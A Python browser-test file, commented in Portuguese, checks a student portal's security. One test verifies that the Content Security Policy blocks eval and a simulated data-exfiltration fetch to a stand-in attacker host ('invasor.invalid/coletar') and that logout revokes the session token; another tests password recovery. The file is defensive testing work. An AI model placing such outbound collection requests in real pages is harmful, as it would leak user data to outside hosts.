"""CSP, logout e recuperação de conta no navegador com servidor e banco reais."""
import server
from tests.test_push_delivery_postgres import postgres,db_env,scalar
from tests.test_push_delivery import configured
from tests.test_evolucao import db
from tests.test_evolucao_browser import runtime,portal


def test_navegador_bloqueia_eval_e_conexao_externa_e_revoga_logout(runtime):
    browser,origin,db=runtime;context,page,errors=portal(browser,origin);externas=[]
    context.route('https://invasor.invalid/**',lambda rota:externas.append(rota.request.url) or rota.abort())
    try:
        token=page.evaluate('SessaoPortal.token()')
        # Runtime.evaluate pode liberar eval para o depurador. Exercite a CSP
        # com um script da própria página, submetido à política do documento.
        page.add_script_tag(content="""
            window.__cspFinalizado=false;
            setTimeout(()=>{
                window.__cspEvalBloqueado=false;
                try { new Function('return 1')(); }
                catch(e) { window.__cspEvalBloqueado=e.name==='EvalError'; }
                window.__cspConexaoBloqueada=null;
                fetch('https://invasor.invalid/coletar',{method:'POST',body:'teste'})
                    .then(()=>window.__cspConexaoBloqueada=false)
                    .catch(()=>window.__cspConexaoBloqueada=true)
                    .finally(()=>window.__cspFinalizado=true);
            },0);
        """)
        page.wait_for_function('()=>window.__cspFinalizado===true')
        assert page.evaluate('window.__cspEvalBloqueado')
        assert page.evaluate('window.__cspConexaoBloqueada')
        assert not externas
        page.evaluate('fazerLogoff(false)')
        assert page.locator('#loginAlunoScreen').is_visible()
        assert page.evaluate('SessaoPortal.token()') is None
        assert server.app.test_client().get('/api/perfil',headers={'Authorization':'Bearer '+token}).status_code==401
        assert scalar(db,'SELECT count(*) FROM auth_tokens_revogados')==1
        assert not errors
    finally:context.close()


def test_recuperacao_pede_codigo_correto_e_preserva_senha_exata(runtime,monkeypatch):
    browser,origin,db=runtime;mensagens=[]
    monkeypatch.setattr('services.email_service.enviar_confirmacao',lambda email,codigo,finalidade:mensagens.append((email,codigo,finalidade)) or True)
    # Abre sem sessão; o código sai apenas pelo provedor interceptado do teste.
    context=browser.new_context(viewport={'width':390,'height':844},service_workers='block')
    context.add_init_script('sessionStorage.setItem("splash_ja_exibido","true")')
    page=context.new_page();errors=[];page.on('pageerror',lambda e:errors.append(str(e)));page.emulate_media(reduced_motion='reduce')
    try:
        page.goto(origin+'/');page.wait_for_selector('#loginAlunoScreen:not(.hidden)')
        page.get_by_role('button',name='Esqueceu a senha?',exact=True).click()
        page.locator('#recEmailAluno').fill('a@aluno.cps.sp.gov.br');page.locator('#btnEnviarCodigoRec').click()
        page.wait_for_selector('#passo2Recuperar:not(.hidden)')
        assert mensagens[0][2]=='recuperacao'
        senha=' Uma senha longa 123! '
        page.locator('#recCodigo').fill(mensagens[0][1]);page.locator('#recSenha').fill(senha)
        page.locator('#formRecuperarAluno button[type=submit]').click()
        page.wait_for_selector('#formLoginAluno:not(.hidden)')
        page.locator('#loginEmailAluno').fill('a@aluno.cps.sp.gov.br');page.locator('#loginSenhaAluno').fill(senha)
        page.locator('#btnAcessoLogin').click();page.wait_for_function("()=>alunoSessao?.email==='a@aluno.cps.sp.gov.br'")
        assert page.locator('#loginAlunoScreen').is_hidden()
        assert not errors
    finally:context.close()
